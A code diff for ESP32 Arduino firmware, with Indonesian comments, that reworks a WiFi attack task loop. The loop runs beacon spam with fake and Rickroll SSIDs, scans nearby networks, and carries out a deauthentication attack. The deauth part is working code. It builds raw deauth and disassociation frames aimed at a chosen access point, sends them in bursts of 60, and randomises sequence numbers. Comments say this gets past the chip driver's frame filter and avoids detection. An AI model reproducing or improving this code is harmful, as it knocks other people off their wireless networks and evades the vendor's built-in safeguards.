@@ -49,146 +49,126 @@ const char* rickRollLyrics[] = {
 uint8_t deauthFrame[26] = { 0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
 uint8_t disasFrame[26]  = { 0xa0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
 
+#include <Arduino.h>
+#include "globals.h" // Pake kutip buat local header
+#include "esp_wifi.h"
+#include "esp_private/wifi.h" // RAHASIA: Masuk ke dapur driver
+
+void stringToMac(String macStr, uint8_t *macAddr) {
+  int values[6];
+  if (6 == sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5])) {
+    for (int i = 0; i < 6; ++i) macAddr[i] = (uint8_t)values[i];
+  }
+}
+
+// ... (beaconPacket, fakeSSIDs, rickRollLyrics, deauthFrame lu tetep sama) ...
+
 void loopWiFi(void * pvParameters) {
   for(;;) {
-   if (isSpamming) {
-   if (!spamUdahSetup) {
+    // --- 1. LOGIKA BEACON SPAM ---
+    if (isSpamming) {
+      if (!spamUdahSetup) {
+        esp_wifi_set_mode(WIFI_MODE_STA); // STA lebih stabil buat beacon
         esp_wifi_set_promiscuous(true);
+        esp_wifi_set_ps(WIFI_PS_NONE); // MATIIN POWER SAVE
         spamUdahSetup = true;
       }
-   
       if (aktifModeSpam == 1) {
-         // --- PELURU BEACON SPAM ---
-         // Tembak paket beacon dengan SSID random
-         
-    
         int randomIdx = esp_random() % 8; 
-        String currentSSID = fakeSSIDs[randomIdx];
-        sendBeacon(currentSSID);
-        // PENTING: Kasih jeda setelah keliling 13 channel biar Core 0 gak panic
+        sendBeacon(fakeSSIDs[randomIdx]);
         vTaskDelay(10 / portTICK_PERIOD_MS); 
       } 
       else if (aktifModeSpam == 2) {
-         // --- PELURU RICKROLL ---
-         // Tembak paket beacon dengan SSID "Never Gonna Give You Up"
-         for (int i = 0; i < 8; i++) {
-        String currentSSID = rickRollLyrics[i];
-        sendBeacon(currentSSID); 
-        vTaskDelay(5 / portTICK_PERIOD_MS); // Kasih napas dikit biar gak overload
-    }
+        for (int i = 0; i < 8; i++) {
+          sendBeacon(rickRollLyrics[i]); 
+          vTaskDelay(5 / portTICK_PERIOD_MS);
+        }
       }
-      else if (aktifModeSpam == 3) {
-         // --- PELURU BLE SPAM ---
-         // (Khusus BLE nanti pake library NimBLE atau BLEDevice)
-      }
-      
-      
-      vTaskDelay(50 / portTICK_PERIOD_MS); // Biar gak crash
-    } else if (triggerScan) {
+      vTaskDelay(50 / portTICK_PERIOD_MS);
+    } 
+    
+    // --- 2. LOGIKA WIFI SCANNER ---
+    else if (triggerScan) {
       sedang_scan = true;
-      
-       adaTarget = false;        // Target lama dihapus
-      targetLockedIdx = -1;     // Indeks kursor di-reset
-      
-      // Bersihin data lama dulu biar fresh
+      adaTarget = false;
+      targetLockedIdx = -1;
       totalWiFi = 0;
       WiFi.mode(WIFI_STA);
       WiFi.disconnect();
       vTaskDelay(100 / portTICK_PERIOD_MS);
 
-      // Mulai Scan (Ini biasanya makan waktu 3-5 detik secara alami)
       int n = WiFi.scanNetworks();
-      
-      totalWiFi = (n > 30) ? 30 : n; // Maksimal 30 biar RAM lega
+      totalWiFi = (n > 30) ? 30 : n;
       for (int i = 0; i < totalWiFi; ++i) {
         listWiFi[i].id = i;
         listWiFi[i].ssid = WiFi.SSID(i);
         listWiFi[i].rssi = WiFi.RSSI(i);
         listWiFi[i].channel = WiFi.channel(i);
-        listWiFi[i].mac = WiFi.BSSIDstr(i); // Ambil MAC target
-
+        listWiFi[i].mac = WiFi.BSSIDstr(i);
       }
-      
       sedang_scan = false;
-      scanDone = true;     // Lapor ke Core 1 kalau udah beres
-      triggerScan = false; // Matiin pelatuknya
+      scanDone = true;
+      triggerScan = false;
     }
-    
-     
-      
-       
+
+    // --- 3. LOGIKA DEAUTH (OMEGA BYPASS S3) ---
+    // Pindahin ke luar biar mandiri Cok!
+    else if (isDeauthing && adaTarget) {
+      if (!deauthUdahSetup) {
+        esp_wifi_stop();
+        esp_wifi_set_mode(WIFI_MODE_STA); // Pake mode STA buat nembus filter 0xC0
+        esp_wifi_start();
+        esp_wifi_set_ps(WIFI_PS_NONE); // WAJIB! Kalo gak, error unsupported muncul
+        esp_wifi_set_promiscuous(true);
+        esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
+        deauthUdahSetup = true;
+      }
+
+      uint8_t apMac[6];
+      stringToMac(targetTerkunci.mac, apMac);
+      uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
+      for (int b = 0; b < 60; b++) { // Naikin burst ke 60!
+        uint16_t seq = (uint16_t)((esp_random() & 0xFFF) << 4);
+        uint8_t rawFrame[26];
+        memcpy(rawFrame, deauthFrame, 26);
         
-         
-          
-           
-    // 1. PINDAH MODE KE AP (Biar lebih sakti kayak GhostESP)
-      else if (isDeauthing && adaTarget) {
-        if (!deauthUdahSetup) {
-            esp_wifi_stop();
-            // Rahasia 1: Set mode ke STA tapi jangan konek mana pun
-            esp_wifi_set_mode(WIFI_MODE_STA); 
-            esp_wifi_start();
-            esp_wifi_set_promiscuous(true);
-            
-            // Rahasia 2: Matikan Power Save TOTAL (Wajib buat S3)
-            esp_wifi_set_ps(WIFI_PS_NONE); 
-            
-            esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
-            deauthUdahSetup = true;
-        }
+        // Peluru 1: Deauth (0xC0) - Reason 0x01 (Unspecified)
+        rawFrame[0] = 0xc0;
+        memcpy(&rawFrame[4], broadcast, 6);
+        memcpy(&rawFrame[10], apMac, 6);
+        memcpy(&rawFrame[16], apMac, 6);
+        rawFrame[22] = seq & 0xFF;
+        rawFrame[23] = (seq >> 8) & 0xFF;
+        rawFrame[24] = 0x01; 
 
-        uint8_t apMac[6];
-        stringToMac(targetTerkunci.mac, apMac);
-        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-
-        // RAHASIA 3: Pakai Burst Kecil tapi Frekuensi Tinggi
-        for (int b = 0; b < 40; b++) {
-            // Sequence Number harus ngacak total!
-            uint16_t seq = (uint16_t)((esp_random() & 0xFFF) << 4);
-            
-            // Build Packet manual di RAM (Biar gak kedetect static filter)
-            uint8_t rawFrame[26];
-            memcpy(rawFrame, deauthFrame, 26);
-            
-            rawFrame[0] = 0xc0; // Deauth
-            memcpy(&rawFrame[4], broadcast, 6);
-            memcpy(&rawFrame[10], apMac, 6);
-            memcpy(&rawFrame[16], apMac, 6);
-            rawFrame[22] = seq & 0xFF;
-            rawFrame[23] = (seq >> 8) & 0xFF;
-            rawFrame[24] = 0x01; // Reason code 1 (Unspecified)
-
-            // INI TRIKNYA: Kirim lewat interface STA (WIFI_IF_STA) 
-            // Kadang driver S3 lebih "longgar" di sini
-            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, rawFrame, 26, false);
-            
-            // Jika masih error 0xC0, kita ganti tipenya jadi Disassoc (0xA0)
-            if (err != ESP_OK) {
-                rawFrame[0] = 0xa0; 
-                esp_wifi_80211_tx(WIFI_IF_STA, rawFrame, 26, false);
-            }
-        }
-        vTaskDelay(1 / portTICK_PERIOD_MS);
+        // Tembak pake en_sys_seq = true (Biar hardware S3 gak curiga)
+        esp_wifi_80211_tx(WIFI_IF_STA, rawFrame, 26, true);
+        
+        // Peluru 2: Disassoc (0xA0)
+        rawFrame[0] = 0xa0;
+        esp_wifi_80211_tx(WIFI_IF_STA, rawFrame, 26, true);
+      }
+      vTaskDelay(1 / portTICK_PERIOD_MS);
     }
 
-    if (!isSpamming) {
-    esp_wifi_set_promiscuous(false);
-     spamUdahSetup = false;
-     } else if (!isDeauthing) {
-     wifi_mode_t currentMode;
-      esp_wifi_get_mode(&currentMode);
+    // --- 4. CLEANUP (MATIIN RADIO KALO GAK DIPAKE) ---
+    if (!isSpamming && !isDeauthing && !triggerScan && !sedang_scan) {
+      wifi_mode_t m;
+      esp_wifi_get_mode(&m);
+      if (m != WIFI_MODE_NULL) {
+        esp_wifi_set_promiscuous(false);
+        esp_wifi_stop();
+        esp_wifi_set_mode(WIFI_MODE_NULL);
+        deauthUdahSetup = false;
+        spamUdahSetup = false;
+      }
+    }
+    vTaskDelay(10 / portTICK_PERIOD_MS); 
+  }
+}
 
-      // Kalau mode masih AP atau STA (berarti WiFi masih ON)
-      if (currentMode != WIFI_MODE_NULL) { 
-          esp_wifi_set_promiscuous(false); // Matiin mode intip
-          esp_wifi_stop();                 // MATIIN TOTAL RADIO WIFI
-          esp_wifi_deinit();
-          esp_wifi_set_mode(WIFI_MODE_NULL); // Set mode ke Kosong
-     deauthUdahSetup = false;
-     }}
-vTaskDelay(10 / portTICK_PERIOD_MS); 
-}
-}
+
 void sendBeacon(String ssid) {
     int ssidLen = ssid.length();
     
